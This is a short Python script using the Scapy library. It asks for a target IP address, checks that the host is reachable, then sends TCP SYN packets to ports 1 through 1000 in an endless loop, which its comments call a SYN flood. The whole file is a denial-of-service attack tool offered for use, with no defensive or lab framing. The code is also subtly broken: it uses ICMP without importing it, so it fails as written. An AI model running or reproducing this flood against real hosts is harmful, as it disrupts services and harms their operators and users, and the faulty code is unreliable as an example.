from scapy.all import IP, TCP, send, sr1
import sys
import time

# check if target is reachable
target = input('Enter the IP address of target: ')
ping = IP(dst=target)/ICMP()
ans = sr1(ping, timeout=5, verbose=False)

if ans == None:
    print('Target is not reachable!')
    sys.exit()

# create syn flood packets
ports = list(range(1, 1001))
pkt = IP(dst=target)/TCP(dport=ports, flags='S')

# endless loop to keep flooding
def synFlood():
    while True:
        send(pkt)
        time.sleep(3)


print('Starting to flood Syn packets...')

# if detected ctrl+c then stop
try:
    synFlood()
except KeyboardInterrupt:
    print('Stopping flood...')
    sys.exit()
